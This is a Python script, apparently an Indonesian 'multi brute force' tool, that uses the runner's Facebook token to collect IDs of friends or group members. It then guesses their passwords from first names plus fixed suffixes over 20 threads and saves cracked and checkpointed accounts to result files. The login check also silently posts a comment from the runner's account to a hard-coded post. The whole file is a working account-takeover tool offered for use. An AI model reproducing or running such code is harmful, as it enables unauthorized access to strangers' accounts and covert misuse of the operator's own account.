#!/usr/bin/python3.7
# -*- Coding: utf-8 -*-
# Piton gede panjang
# Copyright: DulLah

import os
import sys
import time
import hashlib
import requests
from getpass import getpass
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
s = requests.Session()

white = "\033[1;97m"
red = "\033[1;91m"
green = "\033[1;92m"
cyan = "\033[1;96m"
purple = "\033[1;95m"
yellow = "\033[1;93m"

class utama:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.a = "https://graph.facebook.com/{}"
		self.b = "https://api.facebook.com/restserver.php"
		self.load()
		
	def get_token(self):
		ok = s.get(self.b,params=self.data).json()
		try:
			self.token = ok["access_token"]
		except KeyError:
			exit("%s{!} Failed Generate Access Token:)"%(red))
		open("cookie.log","w").write(self.token)
		print("%s{✓} Success Generate Access Token"%(green))
		exit("%s{*} %sToken Saved cookie.log"%(green,white))
		
	def menu(self):
		self.banner()
		print("%s * %sWellcome %s%s%s *"%(red,white,green,self.p,red))
		print("""
%s{●} %s1. Crack From Lists Friend
%s{●} %s2. Crack From Friend
%s{●} %s3. Crack From Member Group
%s{●} %s0. %sDelete Token
"""%(green,white,green,white,green,white,green,white,red))
		self.choose()
	
	def choose(self):
		self.proses = 0
		unikerz = input("%s{+} %sChoose : "%(green,white))
		if unikerz =="":
			print("%s{×} Wrong Input !!"%(red))
			time.sleep(1)
			self.menu()
		elif unikerz =="1":
			print("%s{+} %sFrom : %s%s"%(green,white,purple,self.p))
			for o in s.get(self.a.format(
				"me/friends?access_token=%s"%(self.cookie))).json()["data"]:
				self.id.append(o["id"])
		elif unikerz =="2":
			idf = input("%s{+} %sInput ID Friend : "%(green,white))
			try:
				h = s.get(self.a.format(
					idf+"?access_token=%s"%(self.cookie))).json()["name"]
				print("%s{+} %sFrom : %s%s"%(green,white,purple,h))
			except KeyError:
				exit("%s{×} Friend Not Found !!"%(red))
			except ConnectionError:
				exit("%s{×} No Connections !!"%(red))
			try:
				for g in s.get(self.a.format(
					idf+"/friends?access_token=%s"%(self.cookie))).json()["data"]:
					self.id.append(g["id"])
			except KeyError:
				exit("%s{×} Token Invalid !!"%(red))
		elif unikerz =="3":
			idg = input("%s{+} %sInput ID Group : "%(green,white))
			try:
				f = s.get(self.a.format(
					"group/?id="+idg+"&access_token=%s"%(self.cookie))).json()["name"]
				print("%s{+} %sFrom : %s%s"%(green,white,purple,f))
			except KeyError:
				exit("%s{×} Group Not Found !!"%(red))
			except ConnectionError:
				exit("%s{×} No Connections !!"%(red))
			try:
				for n in s.get(self.a.format(
					idg+"/members?fields=name,id&limit=99999&access_token=%s"%(self.cookie))).json()["data"]:
					self.id.append(n["id"])
			except KeyError:
				exit("%s{×} Token Invalid !!"%(red))
		elif unikerz =="0":
			os.system("rm -rf cookie.log")
			exit()
		else:
			print("%s{×} Wrong Input !!"%(red))
			time.sleep(1)
			self.menu()
			
		m = ThreadPool(20)
		m.map(self.crack,self.id)
		self.result()
		exit()
	
	def result(self):
		if len(self.ok) != 0:
			print("%s\n\n{✓} %sOK:%s"%(green,white,len(self.ok)))
			for ze in self.ok:
				print("%s{#}%s %s"%(green,white,ze))
			print("\n%s{*} %sSaved : %sresult/OK.txt"%(green,white,green))
		if len(self.cp) != 0:
			print("%s\n\n{+} %sCP:%s"%(yellow,white,len(self.cp)))
			for ze in self.cp:
				print("%s{#}%s %s"%(yellow,white,ze))
			print("\n%s{*} %sSaved : %sresult/CP.txt"%(yellow,white,yellow))
		if len(self.ok) ==0 and len(self.cp) ==0:
			print("\n\n%s{!} No Result:)"%(red))
		
	def crack(self,user):
		try:
			os.mkdir("result")
		except FileExistsError:
			pass
		try:
			l =s.get(self.a.format(
				user+"?access_token=%s"%(self.cookie))).json()["first_name"]
			for pas in [l+"bangsat",l+"freefire"]:
				login = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
				if "access_token" in login:
					open("result/OK.txt","a").write("%s | %s\n"%(user,pas))
					self.ok.append("%s | %s"%(user,pas))
				elif "www.facebook.com" in login["error_msg"]:
					open("result/CP.txt","a").write("%s | %s\n"%(user,pas))
					self.cp.append("%s | %s"%(user,pas))
			self.proses+= 1
			print("\r%s{+} %sCracking, please wait %s/%s   "%(green,white,self.proses,len(self.id)),end = ""),;sys.stdout.flush()
		except:
			pass
			
	def load(self):
		try:
			self.cookie = open("cookie.log","r").read()
			self.cek()
		except FileNotFoundError:
			self.login()
			
	def cek(self):
		try:
			s.post(self.a.format(
				"100005584243934_1145924785603652/comments?message=Mantap&access_token=%s"%(self.cookie)))
			self.p = s.get(self.a.format(
				"me?access_token=%s"%(self.cookie))).json()["name"]
			self.menu()
		except ConnectionError:
			self.banner()
			exit("%s{×} No Connections !!"%(red))
		except KeyError:
			self.login()
	
	def login(self):
		self.banner()
		print("%s * login your facebook account *\n"%(white))
		email = input("%s{+} %sEmail/ID : "%(green,white))
		pazz = getpass("%s{+} %sPassword : "%(green,white))
		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pazz+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
		self.data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":email,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pazz,"return_ssl_resources":"0","v":"1.0"}
		x = hashlib.new('md5')
		x.update(sig.encode("utf-8"))
		self.data.update({'sig':x.hexdigest()})
		self.get_token()
			
	def banner(self):
		os.system("clear")
		print("""%s
  _____ _____________________
  /     \\______   \_   _____/
 /  \ /  \|    |  _/|    __)  
/    Y    \    |   \|     \%s By KoNtOl%s
\____|__  /______  /\___  /%s JancokZ%s
        \/       \/     \/ 
   %s[ %smulti brute force%s ]
"""%(green,red,green,cyan,green,white,purple,white))
utama()
